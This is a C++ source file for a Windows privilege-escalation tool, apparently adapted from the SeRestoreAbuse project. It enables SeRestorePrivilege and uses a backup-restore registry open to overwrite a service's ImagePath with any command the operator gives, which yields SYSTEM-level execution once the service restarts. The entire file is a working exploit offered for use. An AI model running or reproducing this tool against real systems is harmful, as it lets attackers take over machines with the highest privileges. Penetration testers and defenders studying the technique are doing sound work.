#include <iostream>
#include <windows.h>

// Reference: https://github.com/xct/SeRestoreAbuse

int main(int argc, char* argv[])
{
    std::string command;
    std::string service_path;
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    HKEY handle_key;
    LONG result;
    DWORD disposition;

    if (argc > 2) {
        command = argv[1];
        service_path = argv[2];
    }
    else {
        std::cout << "Usage: program.exe {cmd} [registry_path]" << std::endl;
        std::cout << "\nExamples:" << std::endl;
        std::cout << "\tprogram.exe \"cmd /c whoami\" \"SYSTEM\\CurrentControlSet\\Services\\SecLogon\"" << std::endl;
        exit(1);
    }

    std::cout << "[+] Setting the ImagePath of the service you specified..." << std::endl;
    std::cout << "[+] Opening curent process in order to enable SeRestorePrivilege..." << std::endl;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValue(NULL, SE_RESTORE_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1; 
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);

    std::cout << "[+] Privilege \"SeRestorePrivilege\" enabled" << std::endl;

    result = RegCreateKeyExA(
        HKEY_LOCAL_MACHINE,
        service_path.c_str(),
        0,
        NULL,
        REG_OPTION_BACKUP_RESTORE,
        KEY_SET_VALUE,
        NULL,
        &handle_key,
        &disposition);

    if (result != 0) {
        std::cout << "[!] RegCreateKeyExA failed with return value: " << result << std::endl;
        std::cout << "[!] Error code: " << GetLastError() << std::endl;
        exit(0);
    }
    else {
        if (disposition == 1L) {
            std::cout << "[+] Successfully created the new registry key" << std::endl;
        }
        else if (disposition == 2L) {
            std::cout << "[+] Successfully opened the registry key" << std::endl;
        }
    }

    result = RegSetValueExA(
        handle_key, 
        "ImagePath", 
        0, 
        REG_SZ,
        reinterpret_cast<const BYTE*>(command.c_str()), 
        command.length() + 1);   

    if (result != 0) {
        std::cout << "[!] RegSetValueExA failed with return value: " << result << std::endl;
        std::cout << "[!] Error code: " << GetLastError() << std::endl;
        exit(0);
    }
    else {
        std::cout << "[+] Successfully changed the ImagePath value of specified registry key." << std::endl;
        std::cout << "[+] Now all you have to do is restart the service." << std::endl;
    }
}
